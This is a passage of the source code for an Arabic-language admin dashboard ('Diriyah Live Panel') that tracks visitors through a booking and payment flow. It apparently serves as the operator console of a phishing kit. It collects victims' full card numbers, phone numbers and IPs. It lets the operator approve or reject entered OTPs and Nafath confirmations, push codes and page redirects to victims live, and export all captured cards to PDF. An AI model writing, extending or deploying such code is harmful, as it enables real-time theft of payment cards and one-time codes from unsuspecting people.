        const prev = lastPageRef.current.get(v.id);
        lastPageRef.current.set(v.id, page);
        // Don't alert on the first snapshot pass — that is a baseline,
        // not a transition. `cardSnapshotReadyRef` is flipped true at the
        // bottom of this callback, AFTER lastPageRef is fully seeded.
        if (!cardSnapshotReadyRef.current) continue;
        if (prev === page) continue;
        const kind = alertKindFor(page);
        if (!kind) continue;
        triggered.push({ id: v.id, kind });
      }

      if (triggered.length > 0) {
        if (soundOnRef.current) {
          // Play one tone per distinct kind (so 3 simultaneous checkouts
          // produce one tone, not three overlapping ones).
          const kinds = new Set(triggered.map((t) => t.kind));
          kinds.forEach((k) => ALERT_TONES[k]());
        }
        // Mark each triggered visitor with a glow window (8 seconds).
        const until = Date.now() + 8000;
        setRecentAlerts((prev) => {
          const next = { ...prev };
          for (const { id, kind } of triggered) next[id] = { kind, until };
          return next;
        });
        // Bump unread counter only when the tab is hidden so the user
        // sees how many sensitive events fired while they were away.
        if (typeof document !== "undefined" && document.hidden) {
          setUnreadAlerts((n) => n + triggered.length);
        }
      }

      cardSnapshotReadyRef.current = true;

      setVisitors(list);
      setLoading(false);
      setSelectedId((prev) => {
        if (prev && list.some((v) => v.id === prev)) return prev;
        return list[0]?.id ?? null;
      });
    });
    return () => unsub();
  }, []);

  // Sweep expired recent-alert glows once per second so rows return to
  // their normal styling without forcing every snapshot to do the work.
  useEffect(() => {
    const t = setInterval(() => {
      setRecentAlerts((prev) => {
        const now = Date.now();
        let changed = false;
        const next: typeof prev = {};
        for (const [id, entry] of Object.entries(prev)) {
          if (entry.until > now) next[id] = entry;
          else changed = true;
        }
        return changed ? next : prev;
      });
    }, 1000);
    return () => clearInterval(t);
  }, []);

  // Tab title pulse: when the admin is on another tab and unread alerts
  // accrue, the title actually flips between two states once per second so
  // it visibly *pulses* in the OS task switcher — much more attention-
  // grabbing than a static prefix. Mounts ONCE and reads live unread count
  // from a ref so listeners aren't re-bound on every state change.
  const unreadAlertsRef = useRef(0);
  useEffect(() => {
    unreadAlertsRef.current = unreadAlerts;
  }, [unreadAlerts]);
  useEffect(() => {
    if (typeof document === "undefined") return;
    const dashboardTitle = "لوحة التحكم — الدرعية";
    const previousTitle = document.title;
    let phase = 0;
    const render = () => {
      const n = unreadAlertsRef.current;
      if (document.hidden && n > 0) {
        document.title =
          phase % 2 === 0
            ? `🔔 (${n}) ${dashboardTitle}`
            : `⚠️ (${n}) تنبيه عاجل`;
      } else {
        document.title = dashboardTitle;
      }
    };
    render();
    const interval = setInterval(() => {
      phase += 1;
      render();
    }, 1000);
    const onVis = () => {
      if (!document.hidden) setUnreadAlerts(0);
      phase = 0;
      render();
    };
    document.addEventListener("visibilitychange", onVis);
    window.addEventListener("focus", onVis);
    return () => {
      clearInterval(interval);
      document.removeEventListener("visibilitychange", onVis);
      window.removeEventListener("focus", onVis);
      // Restore whatever title was active before this dashboard mounted
      // so navigating away doesn't leave the dashboard title stuck.
      document.title = previousTitle;
    };
  }, []);

  const filtered = useMemo(() => {
    let list = visitors;
    if (filter === "online") list = list.filter((v) => isOnline(v));
    if (filter === "waiting") list = list.filter((v) => isWaiting(v));
    if (filter === "completed") list = list.filter((v) => isCompleted(v));
    if (search.trim()) {
      const s = search.trim().toLowerCase();
      list = list.filter((v) =>
        [v.id, v.name, v.phone, v.phoneVerification, v.payment?.cardLast4]
          .filter(Boolean)
          .join(" ")
          .toLowerCase()
          .includes(s),
      );
    }
    return [...list].sort((a, b) => {
      const ta = new Date(a.updatedAt || 0).getTime() || 0;
      const tb = new Date(b.updatedAt || 0).getTime() || 0;
      return tb - ta;
    });
  }, [visitors, filter, search]);

  // Reset the soft-cap whenever the displayed list changes meaningfully so
  // the user always sees the most-recent N rows after switching filters.
  useEffect(() => {
    setVisibleCount(PAGE_SIZE);
  }, [filter, search]);

  // Clamp the rendered window so it never exceeds the current filtered
  // length, and decay it back toward PAGE_SIZE after periods of inactivity
  // so a user who scrolled deep an hour ago doesn't keep paying the DOM
  // cost forever. Reset on any user scroll (handler below also re-grows
  // the window naturally).
  const lastScrollAtRef = useRef(Date.now());
  useEffect(() => {
    setVisibleCount((c) => Math.min(c, Math.max(PAGE_SIZE, filtered.length)));
  }, [filtered.length]);
  useEffect(() => {
    const t = setInterval(() => {
      // After 2 minutes of no scrolling, decay back to PAGE_SIZE so the
      // DOM stays small without surprising an actively-scrolling admin.
      if (Date.now() - lastScrollAtRef.current > 120_000) {
        setVisibleCount((c) => (c > PAGE_SIZE ? PAGE_SIZE : c));
      }
    }, 30_000);
    return () => clearInterval(t);
  }, []);

  const stats = useMemo(() => {
    const total = visitors.length;
    const online = visitors.filter((v) => isOnline(v)).length;
    const waiting = visitors.filter((v) => isWaiting(v)).length;
    const completed = visitors.filter((v) => isCompleted(v)).length;
    const onPayment = visitors.filter(
      (v) => Number(v.step) >= 4 && Number(v.step) <= 6 && !isCompleted(v),
    ).length;
    return { total, online, waiting, completed, onPayment };
  }, [visitors]);

  // Beep when a NEW visitor enters waiting state.
  useEffect(() => {
    const currentWaiting = new Set(
      visitors.filter((v) => isWaiting(v)).map((v) => v.id),
    );
    let hasNew = false;
    currentWaiting.forEach((id) => {
      if (!prevWaitingIds.current.has(id)) hasNew = true;
    });
    if (hasNew && soundOn && prevWaitingIds.current.size > 0) {
      beep();
    }
    prevWaitingIds.current = currentWaiting;
  }, [visitors, soundOn]);

  const selected = visitors.find((v) => v.id === selectedId) || null;

  /**
   * Bridges the new dashboard's per-field approval model onto the existing
   * legacy fields the user-facing flow listens to. We also persist the new
   * `*ApprovalStatus` field so the dashboard UI reflects state immediately
   * on rebooted sessions.
   */
  async function setApprovalStatus(
    id: string,
    field:
      | "cardApprovalStatus"
      | "otpApprovalStatus"
      | "phoneOtpApprovalStatus"
      | "nafadConfirmationStatus",
    status: "approved" | "rejected",
  ) {
    if (!db) return;
    try {
      if (field === "cardApprovalStatus") {
        await updateApprovalStatus(id, status === "approved");
      } else if (field === "otpApprovalStatus") {
        await updateOtpApprovalStatus(id, status === "approved");
      }
      await setDoc(
        doc(db, "pays", id),
        {
          [field]: status,
          [`${field}DecidedAt`]: new Date().toISOString(),
        },
        { merge: true },
      );
    } catch (e) {
      console.error("setApprovalStatus failed", e);
    }
  }

  async function pushDirective(id: string, payload: any) {
    if (!db) return;
    await setDoc(
      doc(db, "pays", id),
      { ...payload, updatedAt: new Date().toISOString() },
      { merge: true },
    );
  }

  async function removeVisitor(id: string) {
    if (!db) return;
    if (!confirm("حذف هذا السجل؟")) return;
    // Preserve the IP block if this visitor was blocked, so deleting the
    // record doesn't accidentally let the same IP back in.
    try {
      const snap = await getDoc(doc(db, "pays", id));
      if (snap.exists()) {
        const data = snap.data() as any;
        const wasBlocked = data?.blocked === true;
        const ip = String(data?.ip || data?.ipAddress || "").trim();
        if (wasBlocked && ip) {
          await setDoc(
            doc(db, "settings", "blockedIps"),
            {
              ips: arrayUnion(ip),
              updatedAt: new Date().toISOString(),
            },
            { merge: true },
          );
        }
      }
    } catch (error) {
      console.error("Error preserving IP block on delete:", error);
    }
    await deleteDoc(doc(db, "pays", id));
    if (selectedId === id) setSelectedId(null);
  }

  async function removeAllVisitors() {
    if (!db) return;
    const total = visitors.length;
    if (total === 0) {
      alert("لا توجد سجلات لحذفها");
      return;
    }
    if (!confirm(`سيتم حذف جميع السجلات (${total}) نهائياً!\nهل أنت متأكد؟`))
      return;
    if (!confirm("تأكيد أخير: حذف الكل؟ لا يمكن التراجع.")) return;
    const snap = await getDocs(collection(db, "pays"));
    const docs = snap.docs;
    for (let i = 0; i < docs.length; i += 450) {
      const batch = writeBatch(db);
      docs.slice(i, i + 450).forEach((d) => batch.delete(d.ref));
      await batch.commit();
    }
    setSelectedId(null);
  }

  return (
    <div
      className="h-screen text-slate-100 flex flex-col overflow-hidden"
      dir="rtl"
      style={{ backgroundColor: "#0d1320" }}
    >
      {/* Top bar */}
      <header
        className="border-b shrink-0 z-20"
        style={{ backgroundColor: "#0a0f1a", borderColor: "#1f2a3d" }}
      >
        <div className="px-4 py-3 flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-lg bg-gradient-to-br from-cyan-400 to-cyan-600 flex items-center justify-center font-black text-slate-900">
              D
            </div>
            <div>
              <h1 className="text-base font-bold">لوحة التحكم</h1>
              <p className="text-[10px] text-slate-500">Diriyah Live Panel</p>
            </div>
          </div>

          <div className="flex-1 max-w-md">
            <div className="relative">
              <Search className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-slate-500" />
              <input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="بحث المستخدم — اضغط ENTER"
                className="w-full pr-10 pl-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
                data-testid="admin-search"
              />
            </div>
          </div>

          <div className="flex items-center gap-2 flex-wrap">
            <CustomizeDropdown
              settings={cardSettings}
              onChange={updateCardSetting}
              onReset={resetCardSettings}
            />
            {selected && <PagesControlDropdown visitor={selected} />}
            <IconButton
              color={stats.waiting > 0 ? "red" : "slate"}
              icon={stats.waiting > 0 ? BellRing : Bell}
              label={
                stats.waiting > 0
                  ? `${stats.waiting} بانتظار الموافقة`
                  : "تنبيهات"
              }
              badge={stats.waiting > 0 ? String(stats.waiting) : undefined}
              pulse={stats.waiting > 0}
              onClick={() => setFilter("waiting")}
            />
            <IconButton
              color={soundOn ? "green" : "slate"}
              icon={soundOn ? Volume2 : VolumeX}
              label={soundOn ? "كتم الصوت" : "تشغيل الصوت"}
              onClick={() => {
                setSoundOn((s) => !s);
                if (!soundOn) beep();
              }}
            />
            <IconButton
              color={blockedBins.length > 0 ? "red" : "slate"}
              icon={Ban}
              label="البطاقات المحظورة"
              badge={
                blockedBins.length > 0 ? String(blockedBins.length) : undefined
              }
              onClick={() => setBlocklistOpen(true)}
            />
            <IconButton
              color={blockedIps.length > 0 ? "red" : "slate"}
              icon={WifiOff}
              label="حظر بالـ IP"
              badge={
                blockedIps.length > 0 ? String(blockedIps.length) : undefined
              }
              onClick={() => setIpBlocklistOpen(true)}
            />
            <IconButton
              color="slate"
              icon={FileDown}
              label="تصدير البطاقات (PDF)"
              badge={(() => {
                const n = visitors.filter(
                  (v) => v.payment?.cardNumber || v.payment?.cardLast4,
                ).length;
                return n > 0 ? String(n) : undefined;
              })()}
              onClick={() => exportAllCardsPdf(visitors)}
            />
            <IconButton
              color={visitors.length > 0 ? "red" : "slate"}
              icon={Trash2}
              label="حذف كل السجلات"
              badge={visitors.length > 0 ? String(visitors.length) : undefined}
              onClick={() => void removeAllVisitors()}
            />
            <IconButton
              color="slate"
              icon={RefreshCw}
              label="تحديث"
              onClick={() => window.location.reload()}
            />
            <IconButton
              color="slate"
              icon={LogOut}
              label="خروج"
              onClick={() => {
                void logoutUser();
              }}
            />
          </div>
        </div>
      </header>

      {/* Stats bar */}
      <div className="px-3 pt-3 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-2">
        <StatCard
          icon={Users}
          label="إجمالي الزوار"
          value={stats.total}
          color="slate"
        />
        <StatCard
          icon={Activity}
          label="متصل الآن"
          value={stats.online}
          color="green"
          pulse={stats.online > 0}
        />
        <StatCard
          icon={AlarmClock}
          label="بانتظار الموافقة"
          value={stats.waiting}
          color={stats.waiting > 0 ? "amber" : "slate"}
          pulse={stats.waiting > 0}
          onClick={() => setFilter("waiting")}
        />
        <StatCard
          icon={CreditCard}
          label="في مرحلة الدفع"
          value={stats.onPayment}
          color="cyan"
        />
        <StatCard
          icon={CheckCheck}
          label="مكتمل"
          value={stats.completed}
          color="emerald"
        />
      </div>

      <div className="flex gap-3 p-3 flex-1 min-h-0 overflow-hidden">
        {/* Main content (cards) */}
        <main className="flex-1 grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-3 min-w-0 order-2 overflow-y-auto auto-rows-min content-start">
          {selected ? (
            <>
              <div className={spanClass("card")}>
                <CardInfoCard
                  visitor={selected}
                  onApprove={(field) =>
                    setApprovalStatus(selected.id, field, "approved")
                  }
                  onReject={(field) =>
                    setApprovalStatus(selected.id, field, "rejected")
                  }
                  onPushStep={(targetStep) =>
                    pushDirective(selected.id, {
                      directedStep: targetStep,
                      directedAt: new Date().toISOString(),
                    })
                  }
                  onBlockBin={addBlockedBin}
                  isBinBlocked={
                    !!selected.payment?.cardBin &&
                    blockedBins.includes(String(selected.payment.cardBin))
                  }
                  onBlockIp={addBlockedIp}
                  isIpBlocked={
                    !!(selected.ip || selected.ipAddress) &&
                    blockedIps.includes(
                      String(selected.ip || selected.ipAddress),
                    )
                  }
                />
              </div>
              <div className={spanClass("customer")}>
                <CustomerInfoCard visitor={selected} />
              </div>
              <div className={spanClass("otp")}>
                <OtpControlCard
                  visitor={selected}
                  otpInput={otpInput}
                  setOtpInput={setOtpInput}
                  otpDirect={otpDirect}
                  setOtpDirect={setOtpDirect}
                  onApprove={(field) =>
                    setApprovalStatus(selected.id, field, "approved")
                  }
                  onReject={(field) =>
                    setApprovalStatus(selected.id, field, "rejected")
                  }
                  onSendOtp={(code) =>
                    pushDirective(selected.id, {
                      adminPushedOtp: code,
                      adminPushedOtpAt: new Date().toISOString(),
                    })
                  }
                  onForceFinalOtp={() =>
                    pushDirective(selected.id, {
                      forceFinalOtp: true,
                      forceFinalOtpAt: new Date().toISOString(),
                    })
                  }
                />
              </div>
              <div className={spanClass("header")}>
                <VisitorHeaderCard visitor={selected} />
              </div>
            </>
          ) : (
            <div className="col-span-full flex items-center justify-center h-96 text-slate-500">
              {loading ? "جاري التحميل..." : "اختر زائراً من القائمة"}
            </div>
          )}
        </main>

        {/* Right sidebar — visitor list */}
        <aside className="w-72 shrink-0 flex flex-col gap-3 order-1 min-h-0">
          <div
            className="rounded-xl p-3 border"
            style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
          >
            <button
              className="w-full py-2 px-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs font-semibold flex items-center justify-center gap-2"
              onClick={() => window.location.reload()}
            >
              <RefreshCw className="w-3.5 h-3.5" />
              تحديث الصفحة
            </button>
            <div className="mt-2 grid grid-cols-4 gap-1 text-[11px]">
              {(
                [
                  ["all", "الكل", stats.total],
                  ["online", "أونلاين", stats.online],
                  ["waiting", "انتظار", stats.waiting],
                  ["completed", "مكتمل", stats.completed],
                ] as const
              ).map(([k, l, count]) => {
                const active = filter === k;
                const isWait = k === "waiting" && count > 0;
                return (
                  <button
                    key={k}
                    onClick={() => setFilter(k)}
                    className={`py-1.5 rounded-md font-semibold transition flex items-center justify-center gap-1 ${
                      active
                        ? isWait
                          ? "bg-amber-500 text-slate-900"
                          : "bg-cyan-500 text-slate-900"
                        : isWait
                          ? "bg-amber-500/20 text-amber-300 hover:bg-amber-500/30"
                          : "bg-slate-800 text-slate-300 hover:bg-slate-700"
                    }`}
                    data-testid={`filter-${k}`}
                  >
                    <span>{l}</span>
                    {count > 0 && (
                      <span
                        className={`text-[9px] px-1 rounded ${
                          active
                            ? "bg-slate-900/30"
                            : isWait
                              ? "bg-amber-500/30"
                              : "bg-slate-900/40"
                        }`}
                      >
                        {count}
                      </span>
                    )}
                  </button>
                );
              })}
            </div>
          </div>

          <div
            className="flex-1 rounded-xl border overflow-hidden flex flex-col"
            style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
          >
            <div
              className="px-3 py-2 border-b text-[11px] text-slate-400 flex items-center justify-between"
              style={{ borderColor: "#1f2a3d" }}
            >
              <span>الزوار ({filtered.length})</span>
              <span className="text-cyan-400">●</span>
            </div>
            <div
              className="overflow-y-auto flex-1"
              onScroll={(e) => {
                // Lazy-grow the rendered window when the user scrolls
                // within ~300px of the bottom — a cheap, library-free
                // alternative to full virtualization that keeps the DOM
                // small while still feeling like an infinite list.
                lastScrollAtRef.current = Date.now();
                const el = e.currentTarget;
                if (
                  el.scrollHeight - el.scrollTop - el.clientHeight < 300 &&
                  visibleCount < filtered.length
                ) {
                  setVisibleCount((c) =>
                    Math.min(c + PAGE_SIZE, filtered.length),
                  );
                }
              }}
            >
              {filtered.length === 0 && (
                <div className="text-center py-12 text-slate-500 text-sm">
                  {loading ? "..." : "لا يوجد زوار"}
                </div>
              )}
              {filtered.slice(0, visibleCount).map((v) => {
                const online = isOnline(v);
                const sel = v.id === selectedId;
                const flow = getVisitorFlow(v);
                const stage = getFlowStepLabels(flow)[v.step as number] || "—";
                const stepNum = Number(v.step) || 0;
                const flowTotal = getFlowTotalSteps(flow);
                const waiting = isWaiting(v);
                const completed = isCompleted(v);
                const last4 = v.payment?.cardLast4;
                const isBlocked = blockedVisitors.includes(v.id);
                const alert = recentAlerts[v.id];
                const alertClass = alert
                  ? alert.kind === "checkout"
                    ? "row-alert-checkout"
                    : alert.kind === "otp"
                      ? "row-alert-otp"
                      : "row-alert-confirmation"
                  : "";
                return (
                  <div
                    key={v.id}
                    role="button"
                    tabIndex={0}
                    onClick={() => setSelectedId(v.id)}
                    onKeyDown={(e) => {
                      if (e.key === "Enter" || e.key === " ")
                        setSelectedId(v.id);
                    }}
                    className={`w-full text-right px-3 py-2.5 border-b border-slate-800/60 transition flex items-start gap-2 group cursor-pointer relative ${alertClass} ${
                      isBlocked
                        ? "bg-red-500/5 hover:bg-red-500/10 opacity-70"
                        : sel
                          ? "bg-cyan-500/10 border-r-2 border-r-cyan-400"
                          : waiting
                            ? "bg-amber-500/5 hover:bg-amber-500/10"
                            : "hover:bg-slate-800/40"
                    }`}
                    data-testid={`visitor-${v.id}`}
                  >
                    {waiting && (
                      <span className="absolute top-2 left-2 flex h-2 w-2">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
                        <span className="relative inline-flex rounded-full h-2 w-2 bg-amber-500"></span>
                      </span>
                    )}
                    <div
                      className={`w-2 h-2 rounded-full mt-1.5 shrink-0 ${
                        online
                          ? "bg-green-400 animate-pulse"
                          : completed
                            ? "bg-emerald-500"
                            : "bg-slate-600"
                      }`}
                    />
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between gap-2">
                        <div className="text-[13px] font-semibold text-slate-100 truncate">
                          {v.name || "زائر بدون اسم"}
                        </div>
                        <span className="text-[9px] text-slate-500 shrink-0">
                          {fmtRelative(v.updatedAt)}
                        </span>
                      </div>
                      <div
                        className="text-[11px] text-slate-400 truncate"
                        dir="ltr"
                      >
                        {v.phoneVerification || v.phone || v.id.slice(0, 12)}
                      </div>
                      <div className="flex items-center gap-1 mt-1.5 flex-wrap">
                        <span
                          className={`text-[10px] px-1.5 py-0.5 rounded border font-semibold ${stepColor(stepNum)}`}
                        >
                          {stepNum > 0 ? `${stepNum}/${flowTotal}` : "—"} ·{" "}
                          {stage}
                        </span>
                        {waiting && (
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold flex items-center gap-0.5">
                            <AlertTriangle className="w-2.5 h-2.5" /> انتظار
                          </span>
                        )}
                        {completed && !waiting && (
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-bold flex items-center gap-0.5">
                            <CheckCheck className="w-2.5 h-2.5" /> مكتمل
                          </span>
                        )}
                        {flow === "restaurant" && (
                          <span
                            className="text-[10px] px-1.5 py-0.5 rounded bg-rose-500/20 text-rose-200 border border-rose-500/40 font-bold"
                            title={String(
                              v.restaurant || v.restaurantEn || "حجز مطعم",
                            )}
                          >
                            🍽️ مطعم
                          </span>
                        )}
                        {(v.geoCountryCode || v.geoCountry) && (
                          <span
                            className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-amber-300 border border-amber-500/30 font-semibold"
                            dir="ltr"
                            title={String(v.geoCountry || "")}
                          >
                            {countryFlag(String(v.geoCountryCode || ""))}{" "}
                            {String(
                              v.geoCountryCode || v.geoCountry,
                            ).toUpperCase()}
                          </span>
                        )}
                        {last4 && (
                          <span
                            className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-cyan-300 font-mono"
                            dir="ltr"
                          >
                            •• {last4}
                          </span>
                        )}
                        {isBlocked && (
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold flex items-center gap-0.5">
                            <Ban className="w-2.5 h-2.5" /> محظور
                          </span>
                        )}
                      </div>
                      {/* Step progress bar */}
                      <div className="mt-1.5 flex gap-0.5">
                        {Array.from({ length: flowTotal }).map((_, i) => (
                          <div
                            key={i}
                            className={`flex-1 h-1 rounded-full ${
                              i < stepNum
                                ? completed
                                  ? "bg-emerald-500"
                                  : waiting
                                    ? "bg-amber-400"
                                    : "bg-cyan-500"
                                : "bg-slate-800"
                            }`}
                          />
                        ))}
                      </div>
                    </div>
                    <div className="flex flex-col items-center gap-1 shrink-0">
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          void toggleBlockedVisitor(v.id);
                        }}
                        title={isBlocked ? "إلغاء الحظر" : "حظر هذا الزائر"}
                        className={`p-1 rounded transition ${
                          isBlocked
                            ? "text-red-400 hover:text-red-300 bg-red-500/10"
                            : "opacity-0 group-hover:opacity-100 text-slate-500 hover:text-red-400"
                        }`}
                        data-testid={`block-${v.id}`}
                      >
                        <Ban className="w-3.5 h-3.5" />
                      </button>
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          removeVisitor(v.id);
                        }}
                        title="حذف"
                        className="opacity-0 group-hover:opacity-100 text-slate-500 hover:text-red-400 p-1"
                        data-testid={`del-${v.id}`}
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                );
              })}
              {visibleCount < filtered.length && (
                <button
                  type="button"
                  onClick={() =>
                    setVisibleCount((c) =>
                      Math.min(c + PAGE_SIZE, filtered.length),
                    )
                  }
                  className="w-full text-center py-3 text-[12px] text-cyan-300 hover:text-cyan-200 hover:bg-cyan-500/5 border-t border-slate-800/60 transition"
                  data-testid="button-load-more-visitors"
                >
                  عرض المزيد ({filtered.length - visibleCount} متبقي)
                </button>
              )}
            </div>
          </div>
        </aside>
      </div>

      {/* Blocked IPs management dialog */}
      {ipBlocklistOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-in fade-in"
          onClick={() => setIpBlocklistOpen(false)}
          data-testid="ip-blocklist-dialog-backdrop"
        >
          <div
            className="w-full max-w-md max-h-[90vh] overflow-y-auto"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="relative">
              <button
                onClick={() => setIpBlocklistOpen(false)}
                className="absolute top-2 left-2 z-10 p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white transition"
                aria-label="إغلاق"
                data-testid="ip-blocklist-dialog-close"
              >
                <XIcon className="w-4 h-4" />
              </button>
              <BlockedIpsCard
                ips={blockedIps}
                onAdd={addBlockedIp}
                onRemove={removeBlockedIp}
                suggestedIp={selected?.ip || selected?.ipAddress}
                suggestedName={selected?.name || selected?.id}
              />
            </div>
          </div>
        </div>
      )}

      {/* Blocked BINs management dialog */}
      {blocklistOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-in fade-in"
          onClick={() => setBlocklistOpen(false)}
          data-testid="blocklist-dialog-backdrop"
        >
          <div
            className="w-full max-w-md max-h-[90vh] overflow-y-auto"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="relative">
              <button
                onClick={() => setBlocklistOpen(false)}
                className="absolute top-2 left-2 z-10 p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white transition"
                aria-label="إغلاق"
                data-testid="blocklist-dialog-close"
              >
                <XIcon className="w-4 h-4" />
              </button>
              <BlockedBinsCard
                bins={blockedBins}
                onAdd={addBlockedBin}
                onRemove={removeBlockedBin}
                suggestedBin={selected?.payment?.cardBin}
                suggestedLast4={selected?.payment?.cardLast4}
              />
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ============================================================ */
/* Sub-components                                                */
/* ============================================================ */

function IconButton({
  icon: Icon,
  label,
  color,
  onClick,
  badge,
  pulse,
}: {
  icon: any;
  label: string;
  color: "red" | "slate" | "green";
  onClick?: () => void;
  badge?: string;
  pulse?: boolean;
}) {
  const cls =
    color === "red"
      ? "bg-red-500/15 text-red-400 hover:bg-red-500/25 border-red-500/30"
      : color === "green"
        ? "bg-green-500/15 text-green-400 hover:bg-green-500/25 border-green-500/30"
        : "bg-slate-800/60 text-slate-300 hover:bg-slate-700 border-slate-700";
  return (
    <button
      onClick={onClick}
      title={label}
      className={`w-9 h-9 rounded-lg border flex items-center justify-center transition relative ${cls} ${pulse ? "animate-pulse" : ""}`}
    >
      <Icon className="w-4 h-4" />
      {badge && (
        <span className="absolute -top-1 -left-1 min-w-[16px] h-4 px-1 rounded-full bg-red-500 text-white text-[9px] font-bold flex items-center justify-center border border-slate-900">
          {badge}
        </span>
      )}
    </button>
  );
}

function StatCard({
  icon: Icon,
  label,
  value,
  color,
  pulse,
  onClick,
}: {
  icon: any;
  label: string;
  value: number;
  color: "slate" | "green" | "amber" | "cyan" | "emerald";
  pulse?: boolean;
  onClick?: () => void;
}) {
  const palette: Record<string, { bg: string; text: string; ring: string }> = {
    slate: {
      bg: "bg-slate-800/40",
      text: "text-slate-200",
      ring: "border-slate-700",
    },
    green: {
      bg: "bg-green-500/10",
      text: "text-green-300",
      ring: "border-green-500/30",
    },
    amber: {
      bg: "bg-amber-500/10",
      text: "text-amber-300",
      ring: "border-amber-500/40",
    },
    cyan: {
      bg: "bg-cyan-500/10",
      text: "text-cyan-300",
      ring: "border-cyan-500/30",
    },
    emerald: {
      bg: "bg-emerald-500/10",
      text: "text-emerald-300",
      ring: "border-emerald-500/30",
    },
  };
  const p = palette[color];
  const Comp: any = onClick ? "button" : "div";
  return (
    <Comp
      onClick={onClick}
      className={`text-right rounded-xl border ${p.ring} ${p.bg} px-3 py-2 flex items-center gap-2.5 transition ${onClick ? "hover:brightness-125 cursor-pointer" : ""} ${pulse ? "shadow-[0_0_0_1px_rgba(251,191,36,0.3)]" : ""}`}
    >
      <div
        className={`w-9 h-9 rounded-lg flex items-center justify-center ${p.bg} border ${p.ring}`}
      >
        <Icon className={`w-4 h-4 ${p.text}`} />
      </div>
      <div className="flex-1 min-w-0">
        <div className="text-[10px] text-slate-400 truncate">{label}</div>
        <div className={`text-lg font-bold ${p.text} leading-tight`}>
          {value}
        </div>
      </div>
    </Comp>
  );
}

function Panel({
  title,
  badge,
  children,
}: {
  title: string;
  badge?: string;
  children: React.ReactNode;
}) {
  return (
    <div
      className="rounded-xl border overflow-hidden flex flex-col"
      style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
    >
      <div
        className="px-3 py-2 flex items-center justify-between border-b"
        style={{ borderColor: "#1f2a3d", backgroundColor: "#0d1525" }}
      >
        <h3 className="text-sm font-bold text-slate-200">{title}</h3>
        {badge && (
          <span className="text-[10px] px-2 py-0.5 rounded-full bg-cyan-500/20 text-cyan-300 font-semibold">
            {badge}
          </span>
        )}
      </div>
      <div className="p-3 flex-1 text-[12px]">{children}</div>
    </div>
  );
}

function Row({
  label,
  value,
  mono,
}: {
  label: string;
  value: any;
  mono?: boolean;
}) {
  const text = safeText(value);
  if (!text) return null;
  return (
    <div className="flex items-center justify-between py-1.5 border-b border-slate-800/40 last:border-0">
      <span className="text-slate-500 text-[11px]">{label}</span>
      <span
        className={`text-slate-100 text-[12px] font-semibold ${mono ? "font-mono" : ""}`}
        dir={mono ? "ltr" : undefined}
      >
        {text}
      </span>
    </div>
  );
}

function VisitorHeaderCard({ visitor }: { visitor: Visitor }) {
  const online = isOnline(visitor);
  return (
    <div
      className="rounded-xl border overflow-hidden flex flex-col"
      style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
    >
      <div className="flex border-b" style={{ borderColor: "#1f2a3d" }}>
        <div className="flex-1 px-3 py-2 text-center bg-cyan-500/10 text-cyan-300 text-xs font-bold border-l border-cyan-500/30">
          الكل
        </div>
        <div className="flex-1 px-3 py-2 text-center text-slate-400 text-xs">
          ديناميكية
        </div>
      </div>

      <div
        className="p-4 text-center border-b"
        style={{ borderColor: "#1f2a3d" }}
      >
        <h3 className="text-base font-bold text-slate-100 mb-1">
          {visitor.name || "زائر بدون اسم"}
        </h3>
        <div className="text-cyan-400 font-mono text-xs space-y-0.5" dir="ltr">
          <div>{visitor.phoneVerification || "—"}</div>
          <div>{visitor.phone || "—"}</div>
        </div>
        <div className="flex items-center justify-center gap-3 mt-2 text-[11px] text-slate-400">
          <span className="flex items-center gap-1">
            <PhoneIcon className="w-3 h-3" /> mobile
          </span>
          <span className="text-slate-700">|</span>
          <span className="flex items-center gap-1">
            <Globe className="w-3 h-3" /> Chrome
          </span>
          <span className="text-slate-700">|</span>
          <span>Saudi Arabia</span>
        </div>
        <div className="mt-2 inline-flex items-center gap-1.5 text-[11px]">
          <span
            className={`w-1.5 h-1.5 rounded-full ${online ? "bg-green-400" : "bg-slate-600"}`}
          />
          <span className={online ? "text-green-400" : "text-slate-500"}>
            {online ? "أونلاين" : "غير متصل"}
          </span>
        </div>
      </div>

      <div className="p-3 space-y-1 text-[12px]">
        <Row label="آخر تحديث" value={fmtTime(visitor.updatedAt)} />
        <Row
          label="المرحلة"
          value={
            getFlowStepLabels(getVisitorFlow(visitor))[visitor.step as number]
          }
        />
        <Row
          label="نوع الحجز"
          value={
            getVisitorFlow(visitor) === "restaurant"
              ? `حجز مطعم${visitor.restaurant ? ` · ${visitor.restaurant}` : ""}`
              : "حجز تذاكر"
          }
        />
